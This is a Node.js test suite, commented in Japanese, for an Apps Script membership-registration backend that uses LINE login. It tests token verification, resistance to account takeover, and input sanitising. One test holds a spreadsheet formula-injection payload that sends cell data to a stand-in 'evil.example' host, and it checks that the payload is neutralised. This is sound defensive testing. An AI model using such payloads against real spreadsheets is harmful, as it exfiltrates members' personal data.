/**
 * ⚠️ このファイルは Apps Script に貼り付けないでください。
 *    貼るのは Code.gs のほうです。これは Node.js 用のテストで、
 *    Apps Script に貼ると「ReferenceError: require is not defined」になります。
 *
 * Code.gs のテスト。
 *
 * Apps Script の実行環境（SpreadsheetApp / UrlFetchApp / LockService など）を
 * 偽物で置き換えて、本物のスプレッドシートに触らずにロジックだけを動かす。
 *
 *   node gas/Code.test.js
 *
 * 追加パッケージは要らない（Node.js だけで動く）。
 */
const fs = require('fs'), vm = require('vm'), path = require('path');
const SRC = fs.readFileSync(path.join(__dirname, 'Code.gs'), 'utf8');

let pass = 0, fail = 0;
const check = (n, c, e='') => { if (c) { console.log('  ✅', n); pass++; } else { console.log('  ❌', n, e); fail++; } };

function makeEnv(rows, verifyResult) {
  const sheet = {
    _rows: rows.map(r => r.slice()),
    getDataRange: () => ({ getValues: () => sheet._rows.map(r => r.slice()) }),
    getRange: (r, c) => ({ setValue: v => { sheet._rows[r-1][c-1] = v; } }),
    appendRow: r => { sheet._rows.push(r.slice()); }
  };
  let fetchCalls = [];
  const ctx = {
    console,
    SpreadsheetApp: { openById: () => ({ getSheetByName: () => sheet }) },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: t => ({ _t: t, setMimeType() { return this; } })
    },
    LockService: { getScriptLock: () => ({ waitLock(){}, releaseLock(){} }) },
    Utilities: { formatDate: () => '2026/09/21 07:00:00' },
    UrlFetchApp: {
      fetch: (url, opt) => {
        fetchCalls.push({ url, opt });
        if (verifyResult === 'throw') throw new Error('network down');
        if (verifyResult === null) return { getResponseCode: () => 400, getContentText: () => '{"error":"invalid_request"}' };
        return { getResponseCode: () => 200, getContentText: () => JSON.stringify(verifyResult) };
      }
    }
  };
  vm.createContext(ctx);
  vm.runInContext(SRC, ctx);
  return { ctx, sheet, fetchCalls };
}
const OK = sub => ({ sub, aud: '2009831421', iss: 'https://access.line.me', exp: 9e9 });
const call = (ctx, body) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(body) } })._t);

const HEADER = ['LINE ID','会員番号','名前','カナ','住所','電話番号','メール','登録日時'];
const REG = { action:'register', idToken:'tok', name:'山田　太郎', kana:'ヤマダ　タロウ',
              address:'東京都板橋区幸町１-１４', phone:'０３-１２３４-５６７８', email:'a@b.com' };

console.log('\n[1] 認証：偽装できないこと');
{ const { ctx } = makeEnv([HEADER, ['U_alice','1','山田　太郎','','','０９０１１１１２２２２','','']], OK('U_bob'));
  const r = call(ctx, { action:'check', idToken:'tok', userId:'U_alice' });
  check('userIdを自己申告しても無視される', r.status === 'new', JSON.stringify(r)); }
{ const { ctx } = makeEnv([HEADER], null);
  const r = call(ctx, { action:'check', idToken:'bad' });
  check('トークンが無効なら unauthorized', r.status === 'unauthorized'); }
{ const { ctx } = makeEnv([HEADER], OK('U1'));
  const r = call(ctx, { action:'check' });
  check('トークン無しは unauthorized', r.status === 'unauthorized'); }
{ const { ctx } = makeEnv([HEADER], 'throw');
  const r = call(ctx, { action:'check', idToken:'tok' });
  check('LINEに繋がらない時も通さない', r.status === 'unauthorized'); }
{ const { ctx } = makeEnv([HEADER], { sub:'U1', aud:'9999999999' });
  const r = call(ctx, { action:'check', idToken:'tok' });
  check('別チャネル宛のトークンを弾く', r.status === 'unauthorized'); }
{ const { ctx, fetchCalls } = makeEnv([HEADER], OK('U1'));
  call(ctx, { action:'check', idToken:'tok/+=&' });
  const body = fetchCalls[0].opt.payload;
  check('LINEの検証APIを叩いている', fetchCalls[0].url === 'https://api.line.me/oauth2/v2.1/verify');
  check('本文が文字列で組み立てられている', typeof body === 'string', typeof body);
  const form = Object.fromEntries(body.split('&').map(kv => kv.split('=').map(decodeURIComponent)));
  check('client_idが正しい', form.client_id === '2009831421', body);
  check('記号を含むトークンが正しくエスケープされる', form.id_token === 'tok/+=&', body);
  check('Content-Typeがフォーム形式', fetchCalls[0].opt.contentType === 'application/x-www-form-urlencoded'); }

console.log('\n[1b] 失敗の理由が返ること（切り分け用）');
{ const { ctx } = makeEnv([HEADER], null);
  const r = call(ctx, { action:'check', idToken:'tok' });
  check('detail に理由が入る', typeof r.detail === 'string' && r.detail.indexOf('LINEが拒否') === 0, JSON.stringify(r.detail));
  check('detail にトークンが含まれない', r.detail.indexOf('tok') === -1, r.detail); }
{ const { ctx } = makeEnv([HEADER], { sub:'U1', aud:'9999999999' });
  const r = call(ctx, { action:'check', idToken:'tok' });
  check('チャネルID不一致が分かる', r.detail.indexOf('チャネルID不一致') === 0 && r.detail.indexOf('9999999999') > -1, r.detail); }
{ const { ctx } = makeEnv([HEADER], 'throw');
  const r = call(ctx, { action:'check', idToken:'tok' });
  check('接続不可が分かる', r.detail.indexOf('LINEに接続できない') === 0, r.detail); }
{ const { ctx } = makeEnv([HEADER], OK('U1'));
  const r = call(ctx, { action:'check' });
  check('トークン未送信が分かる', r.detail.indexOf('トークンが送られてきていない') === 0, r.detail); }
{ const { ctx } = makeEnv([HEADER], OK('U1'));
  const r = call(ctx, { action:'check', idToken:'tok' });
  check('成功時は detail を返さない', r.detail === undefined, JSON.stringify(r)); }
{ const { ctx } = makeEnv([HEADER], OK('U1'));
  const r = JSON.parse(ctx.doGet({ parameter: { action:'check', uid:'U_alice' } })._t);
  check('GETでは会員番号を返さない', r.status === 'error' && !r.memberId, JSON.stringify(r)); }

console.log('\n[2] 名寄せの乗っ取り（今回の修正点）');
{ // A列に既にaliceのLINE IDが入っている「山田太郎」の行
  const rows = [HEADER, ['U_alice','1','山田　太郎','','','０９０１１１１２２２２','','']];
  const { ctx, sheet } = makeEnv(rows, OK('U_bob'));
  const r = call(ctx, Object.assign({}, REG, { phone:'０９０９９９９８８８８' }));  // 同姓同名・別電話
  check('別人の会員番号を渡さない', r.memberId !== '1', JSON.stringify(r));
  check('新しい会員番号が採番される', r.memberId === '2', r.memberId);
  check('aliceのLINE IDが消えていない', sheet._rows[1][0] === 'U_alice', sheet._rows[1][0]);
  check('行が追加されている', sheet._rows.length === 3); }

console.log('\n[3] 名寄せ（本来やりたいこと）は動くか：氏名と電話の両方が一致');
{ const rows = [HEADER, ['','5','山田　太郎','ヤマダ　タロウ','','０３１２３４５６７８','','']];  // 紙の会員
  const { ctx, sheet } = makeEnv(rows, OK('U_new'));
  const r = call(ctx, REG);
  check('未連携の紙会員と紐付く', r.memberId === '5', JSON.stringify(r));
  check('LINE IDが書き込まれる', sheet._rows[1][0] === 'U_new');
  check('行は増えない', sheet._rows.length === 2); }
{ const rows = [HEADER, ['','5','やまだ たろう','','','03-1234-5678','','']];  // 手入力でひらがな・半角
  const { ctx } = makeEnv(rows, OK('U_new'));
  const r = call(ctx, Object.assign({}, REG, { name:'ヤマダ　タロウ' }));  // フォームはカタカナ・全角で送る
  check('表記ゆれがあっても名寄せできる', r.memberId === '5', JSON.stringify(r)); }

console.log('\n[3b] 名寄せで他人の紙会員を取り込めないこと');
{ // 電話番号だけ知っている別人
  const rows = [HEADER, ['','7','佐藤　花子','','','０３１２３４５６７８','','']];
  const { ctx, sheet } = makeEnv(rows, OK('U_attacker'));
  const r = call(ctx, REG);
  check('電話だけ一致では紐付けない', r.memberId !== '7', JSON.stringify(r));
  check('紙会員のA列は空のまま', sheet._rows[1][0] === ''); }
{ // 氏名だけ知っている別人
  const rows = [HEADER, ['','8','山田　太郎','','','０９０００００００００','','']];
  const { ctx, sheet } = makeEnv(rows, OK('U_attacker'));
  const r = call(ctx, REG);
  check('氏名だけ一致では紐付けない', r.memberId !== '8', JSON.stringify(r));
  check('紙会員のA列は空のまま', sheet._rows[1][0] === ''); }
{ const rows = [HEADER, ['','5','山田　太郎','','','','','']];  // 電話が空欄の紙会員
  const { ctx } = makeEnv(rows, OK('U_new'));
  check('電話空欄の紙会員は自動で紐付けない', call(ctx, REG).memberId !== '5'); }

console.log('\n[4] 会員番号の採番');
{ const rows = [HEADER, ['U_a','1','A','','','','',''], ['U_b','3','B','','','','','']];
  const { ctx } = makeEnv(rows, OK('U_new'));
  const r = call(ctx, Object.assign({}, REG, { name:'新　規', phone:'０８０００００００００' }));
  check('空き番号(2)を埋める', r.memberId === '2', r.memberId); }
{ const rows = [HEADER, ['U_a','1','A','','','','',''], ['U_b','2','B','','','','','']];
  const { ctx } = makeEnv(rows, OK('U_new'));
  const r = call(ctx, Object.assign({}, REG, { name:'新　規', phone:'０８０００００００００' }));
  check('空きが無ければ次の番号(3)', r.memberId === '3', r.memberId); }

console.log('\n[5] 二重登録');
{ const rows = [HEADER, ['U_me','4','山田　太郎','','','０３１２３４５６７８','','']];
  const { ctx, sheet } = makeEnv(rows, OK('U_me'));
  const r = call(ctx, REG);
  check('既存の会員番号を返す', r.memberId === '4', JSON.stringify(r));
  check('行が増えない', sheet._rows.length === 2); }

console.log('\n[6] 入力チェック（サーバー側）');
{ const { ctx } = makeEnv([HEADER], OK('U1'));
  check('氏名が空なら断る', call(ctx, Object.assign({}, REG, { name:'' })).status === 'error');
  check('電話が空なら断る', call(ctx, Object.assign({}, REG, { phone:'' })).status === 'error');
  check('電話が桁数不足なら断る', call(ctx, Object.assign({}, REG, { phone:'１２３' })).status === 'error');
  check('全角の正しい電話は通る', call(ctx, REG).status === 'success'); }

console.log('\n[6b] 数式の埋め込み・異常な入力');
{ const { ctx, sheet } = makeEnv([HEADER], OK('U1'));
  const evil = '=IMAGE("https://evil.example/?"&C2)';
  const r = call(ctx, Object.assign({}, REG, { name: evil, kana: '+1', address: '@x', email: '' }));
  check('登録自体はできる', r.status === 'success', JSON.stringify(r));
  const row = sheet._rows[1];
  check('氏名が数式として書かれない', row[2] === "'" + evil, row[2]);
  check('+ で始まる値も無害化', row[3] === "'+1", row[3]);
  check('@ で始まる値も無害化', row[4] === "'@x", row[4]);
  check('通常の値はそのまま', row[5] === REG.phone, row[5]); }
{ const { ctx, sheet } = makeEnv([HEADER], OK('U1'));
  check('長すぎる住所は断る', call(ctx, Object.assign({}, REG, { address: 'あ'.repeat(5000) })).status === 'error');
  check('文字列でない値は断る', call(ctx, Object.assign({}, REG, { name: { a: 1 } })).status === 'error');
  check('メール形式が不正なら断る', call(ctx, Object.assign({}, REG, { email: 'not-an-email' })).status === 'error');
  check('何も書き込まれていない', sheet._rows.length === 1); }
{ const { ctx } = makeEnv([HEADER], OK('U1'));
  check('本文が null', JSON.parse(ctx.doPost({ postData:{ contents:'null' } })._t).status === 'unauthorized');
  check('idTokenが文字列でない', call(ctx, { action:'check', idToken:{ x:1 } }).status === 'unauthorized'); }

console.log('\n[7] 照会');
{ const rows = [HEADER, ['U_me','9','山田　太郎','','','','','']];
  const { ctx } = makeEnv(rows, OK('U_me'));
  check('自分の会員番号が引ける', call(ctx, { action:'check', idToken:'tok' }).memberId === '9'); }
{ const { ctx } = makeEnv([HEADER], OK('U_nobody'));
  check('未登録は new', call(ctx, { action:'check', idToken:'tok' }).status === 'new'); }

console.log('\n[8] 壊れた入力');
{ const { ctx } = makeEnv([HEADER], OK('U1'));
  check('JSONでない本文', JSON.parse(ctx.doPost({ postData:{ contents:'こわれた' } })._t).status === 'error');
  check('不明なaction', call(ctx, { action:'なにか', idToken:'tok' }).status === 'error'); }

console.log(`\n========== 成功 ${pass} / 失敗 ${fail} ==========`);
process.exit(fail ? 1 : 0);
